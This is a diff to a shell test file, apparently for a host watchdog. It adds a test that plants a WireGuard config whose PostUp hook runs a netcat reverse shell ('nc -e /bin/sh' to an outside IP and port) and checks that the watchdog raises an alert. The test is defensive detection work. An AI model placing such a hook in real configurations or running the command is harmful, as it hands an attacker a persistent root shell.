@@ -259,3 +259,20 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in PostUp hook: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to the brain-wide nc reverse-shell variant INVARIANT
+    # family already locked. WireGuard PostUp/PreUp/PostDown/PreDown
+    # hooks fire AS ROOT on every tunnel state change — a recurring
+    # trigger when the operator brings the VPN up/down (or
+    # auto-reconnect fires on link flap). Sister-vector to
+    # openvpn-config + nm-vpn-plugin on the VPN tunnel persistence
+    # brain.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = nc -e /bin/sh 1.1.1.1 4444\n' > "${CONF}"
+    chmod 0600 "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
